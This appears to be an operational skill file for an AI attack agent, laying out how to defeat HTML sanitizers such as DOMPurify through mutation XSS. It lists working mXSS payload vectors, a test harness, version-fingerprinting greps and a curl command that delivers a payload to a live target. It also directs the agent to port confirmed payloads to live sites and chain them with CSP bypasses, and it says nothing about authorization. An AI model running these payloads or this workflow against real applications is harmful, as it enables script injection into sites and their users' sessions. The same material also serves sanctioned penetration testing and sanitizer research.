---
name: mutation_xss
agent: agent6_xss
description: innerHTML/DOMPurify edge cases — mXSS via nested parsing and sanitizer differentials.
---

# Mutation XSS (mXSS)

## Purpose

Sanitizers promise "this HTML is safe." Mutation XSS breaks that promise: HTML that is inert when the sanitizer inspects it becomes executable after the browser parses and re-serializes it. The classic pattern — `<noscript><p></noscript><img src=x onerror=alert(1)>` — passes DOMPurify's check, then the parser mutates it into a live payload. mXSS lives in the gap between "what the sanitizer saw" and "what the browser built." This skill fingerprints the exact sanitizer and version, runs the known mutation battery for it, hunts sanitizer differentials (two parsers disagreeing), and proves execution through the full sanitize→parse→serialize→insert pipeline. When everyone else's payloads get sanitized, mXSS still fires.

## Division of labor

- **Consumes:** `findings/dom_sink_audit.md` (any trace gated by a sanitizer — needs name/version/config), `findings/filter_signature.md` (server-side sanitization behavior, if any), the app's JS bundles.
- **Produces:** the finished artifact — `findings/mutation_xss.md` — sanitizer fingerprint, every mutation vector tested, the full pipeline proof, and the working mXSS payload. Test harness saved under `evidence/mutation_xss/`.

## When to use / when NOT to use

- **Use when:** a DOM sink (`innerHTML`, jQuery `.html()`, framework HTML binding) is fed through a client-side sanitizer (DOMPurify, sanitize-html, js-xss) — the sanitizer is the thing to defeat.
- **Use when:** the server sanitizes HTML and the client re-renders it (double parsing = double mutation chances).
- **Use when:** you see `<noscript>`, `<template>`, `<style>`, `<math>`, `<svg>`, or `<form>` handling in sanitizer-adjacent code — these are the mutation-prone elements.
- **Skip when (time-pass filter):** the sink assigns `textContent`/`innerText` (no HTML parsing happens — mXSS is impossible, document and stop). Also skip when no sanitizer exists and raw HTML flows to the sink — that's plain DOM XSS, owned by `dom_sink_audit`, not this skill.

## Methodology

1. **Fingerprint the sanitizer.** Find the exact library and version: grep JS bundles for `DOMPurify`, `sanitize-html`, `xss-filters`, `js-xss`. Check `package.json`-in-source-map, CDN URLs with version pins (`dompurify@2.4.0`), and `DOMPurify.version` at runtime. Version matters — every mXSS CVE is version-specific.
2. **Extract the exact config.** Find the `DOMPurify.sanitize(` call and read its options: `ALLOWED_TAGS`, `ALLOWED_ATTR`, `FORBID_TAGS`, `ALLOW_UNKNOWN_PROTOCOLS`, hooks (`uponSanitizeElement`, `afterSanitizeAttributes`). A custom hook that re-allows `data-*` or a missing `FORBID_ATTR` is the bypass. Save the config verbatim.
3. **Map the full pipeline.** Trace the data flow precisely: server response → client sanitizer → `innerHTML` assignment → is there a SECOND parse? (e.g. sanitized HTML stored, then re-rendered; or `innerHTML` set from an already-parsed DOM node's `innerHTML` getter — that getter re-serializes, which is where mutation bites). Draw the pipeline; every parse/serialize step is a mutation opportunity.
4. **Build the local test harness.** Replicate the EXACT sanitizer version + config + pipeline in a local HTML file. Never test mXSS theories against the live target first — the harness gives you unlimited, quiet iterations. The harness must: run the same DOMPurify version, apply the same config, feed output through the same `innerHTML` assignment, and report whether the payload executed.
5. **Run the classic mutation battery** in the harness (each is a known mXSS shape — test verbatim, then mutate):
   - `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` (noscript parsing differential)
   - `<style><p title="</style><img src=x onerror=alert(1)>">` (style differential)
   - `<math><mi//xlink:href="data:x,<script>alert(1)</script>">` (namespace confusion)
   - `<svg><g onload="alert(1)">` variants with foreignObject
   - Nested `<template>` content that the sanitizer can't see into
   - `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>` (the famous nested-form mXSS)
   - `<p><style><img src=x onerror=alert(1)></style>` (style-then-image)
6. **Hunt sanitizer differentials.** If the server sanitizes AND the client sanitizes (or two different libraries), feed the output of sanitizer A into sanitizer B in the harness. Differentials — where A allows something B misparses — are fresh-bypass territory. Also test: server strips `<noscript>`, client keeps it (or reverse).
7. **Test parser-confusion specifics.** Browsers parse `<noscript>` content as text when scripting is enabled but as HTML when disabled — the sanitizer and the browser may disagree about what's inside. Same for `<template>` (inert in DOM, but `innerHTML` serialization exposes content), `<iframe srcdoc>` nesting, and `<math>`/`<svg>` namespace boundaries where `<mi>` and `<mtext>` change parsing rules.
8. **Test DOM clobbering as a mutation assist.** If the sanitizer allows `id`/`name` attributes, named elements can clobber `document` properties (`<form id="x">` → `window.x`). Clobbered globals can break the sanitizer's own logic or the app's guards. Test whether clobbering changes the sanitized output.
9. **Verify the mutation actually happens.** In the harness, log three stages: (a) sanitizer output HTML string, (b) the `innerHTML` after browser parse, (c) whether the payload executed. mXSS is confirmed ONLY when (a) looks safe, (b) differs from (a), and (c) fires. If (a) already looks dangerous, it's not mXSS — it's a sanitizer misconfiguration (still a finding, different skill section).
10. **Port the working vector to the live target.** Take the harness-confirmed payload and deliver it through the real input vector (the stored field, the reflected param, the hash). Confirm the same pipeline exists live: same sanitizer version, same config, same double-parse.
11. **Prove execution live, 2x.** Clean browser profile, load the vector, screenshot the execution. Also capture the sanitizer's output vs the final DOM (devtools: compare `element.innerHTML` before/after) to document the mutation for the report.
12. **Check the sanitizer's CVE history.** Look up the fingerprinted version against known mXSS CVEs (DOMPurify has several: CVE-2021-... series, the `<math><mtext>` bypasses, the `template` bypasses). If the app pins a vulnerable version, the known PoC may work verbatim — test it in the harness first.
13. **Decision branches.**
    - If the harness shows safe→mutated→executed → port to live target immediately; this is a high-value finding.
    - If the sanitizer config is custom and weak (allows `style`, `form`, `math`) → the battery will likely hit; prioritize namespace-confusion vectors.
    - If the sanitizer is latest-version with default config and single parse → mXSS is unlikely; document the version/config and mark NEGATIVE for this pipeline (but re-check when the app updates).
    - If server and client both sanitize differently → differential hunt is the priority; single-sanitizer battery is secondary.

## Exact commands

Fingerprint the sanitizer and version:

```bash
grep -rhoE 'DOMPurify[^"]{0,40}|dompurify@[0-9.]+|sanitize-html@[0-9.]+' \
  evidence/dom_sink_audit/js/ 2>/dev/null | sort -u | head
grep -rn "DOMPurify.sanitize" evidence/dom_sink_audit/js/bundle_*.js 2>/dev/null | head -5
```

Extract the exact sanitize config (read the surrounding code):

```bash
grep -rn -A 15 "DOMPurify.sanitize" evidence/dom_sink_audit/js/bundle_*.js 2>/dev/null \
  | head -60 > evidence/mutation_xss/sanitizer_config.txt
cat evidence/mutation_xss/sanitizer_config.txt
```

Runtime version check (in the browser console on the target):

```js
// paste into devtools console on https://<TARGET>/vulnerable/page
typeof DOMPurify !== 'undefined' && DOMPurify.version
```

Local test harness (save as evidence/mutation_xss/harness.html — use the EXACT version + config):

```html
<!DOCTYPE html><html><head>
<script src="https://cdn.jsdelivr.net/npm/dompurify@<VERSION>/dist/purify.min.js"></script>
</head><body>
<div id="t"></div>
<script>
const vectors = [
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
  '<style><p title="</style><img src=x onerror=alert(1)>">'
];
vectors.forEach((v, i) => {
  const clean = DOMPurify.sanitize(v, {/* EXACT app config here */});
  console.log('vector', i, 'sanitized:', clean);
  document.getElementById('t').innerHTML = clean;   // the mutation step
  console.log('vector', i, 'after innerHTML:', document.getElementById('t').innerHTML);
});
</script></body></html>
```

```bash
mkdir -p evidence/mutation_xss
# serve the harness locally and open in a clean browser profile; watch console + alerts
python3 -m http.server 8901 --directory evidence/mutation_xss &
```

Differential test (server output fed to client sanitizer — simulate both stages):

```bash
# 1. send the vector through the live server-side path, save what comes back
curl -sS --get --data-urlencode 'q=<noscript><p title="</noscript><img src=x onerror=alert(1)>">' \
  "https://<TARGET>/search" --compressed -o evidence/mutation_xss/server_stage.html
# 2. paste the server's returned HTML into the harness as the input to DOMPurify
#    (this replicates the real two-stage pipeline)
```

Live port + proof (after harness confirmation):

```bash
# deliver via the real vector, then in a clean browser profile:
# document.querySelector('#target').innerHTML  -> compare pre/post to show the mutation
# screenshot the alert; save as evidence/mutation_xss/live_proof.png
```

## Completion-bias defenses

- [ ] Sanitizer fingerprinted: exact library, version, and distribution (CDN pin or bundled)
- [ ] Exact sanitize config extracted verbatim (ALLOWED/FORBID lists, hooks)
- [ ] Full pipeline mapped: every parse/serialize step drawn and documented
- [ ] Local harness built with the EXACT version + config (not "a recent DOMPurify")
- [ ] Classic mutation battery run in the harness (7 vector families minimum)
- [ ] Sanitizer differential tested (server vs client, or A vs B)
- [ ] Parser-confusion specifics tested (noscript/template/math/svg namespaces)
- [ ] DOM clobbering assist tested where id/name attributes are allowed
- [ ] Three-stage verification logged: sanitizer output vs post-innerHTML vs execution
- [ ] Working vector ported to the live target through the real input vector
- [ ] Execution proved live 2x in clean profiles with screenshots
- [ ] Sanitizer CVE history checked against the fingerprinted version
- [ ] `findings/mutation_xss.md` exists with fingerprint + vectors + proof
- [ ] **Review step:** agent10_review must verify: (a) the harness used the exact version/config (not approximate), (b) the three-stage log exists showing safe→mutated→executed, (c) live proof is 2x with screenshots, (d) NEGATIVE verdicts name the exact version/config that resisted.
- [ ] **Nudge prompts:**
  - "Keep going until the harness replicates the exact sanitizer version and config — 'close enough' invalidates every result."
  - "Do not report done before findings/mutation_xss.md contains the three-stage mutation log."
  - "If the sanitizer output already looks dangerous, that's misconfiguration, not mXSS — classify it correctly and keep hunting the real mutation."
- [ ] **Finished artifact definition:** `findings/mutation_xss.md` — sanitizer fingerprint (lib/version/config), every vector tested with harness results, the three-stage mutation log for the winner, and live 2x execution proof. Existence + proof IS done.

## Evidence standard

- Baseline: the harness with a benign input (proves the pipeline itself doesn't execute anything); the sanitizer's output for the winning vector (proves it looked safe).
- Reproduction: harness execution + 2x live execution in clean profiles.
- Raw evidence: harness file, console logs of all three stages, server-stage responses, live screenshots.
- Verdicts: CONFIRMED (safe→mutated→executed, 2x live) / INCONCLUSIVE (mutation observed in harness but live pipeline differs — exact difference documented) / NEGATIVE (exact version/config resisted the full battery — documented for re-check on update).

## Handoffs

- `dom_sink_audit`: the sanitizer-gated trace that triggered this skill gets updated with the mXSS verdict.
- `stored_xss_chain`: stored HTML that passes through the sanitizer on render inherits this skill's bypass.
- `csp_bypass_map`: the final mXSS payload must also survive the CSP — combine before the browser proof.
- agent10_review: consumes `findings/mutation_xss.md` plus the three-stage logs and screenshots.
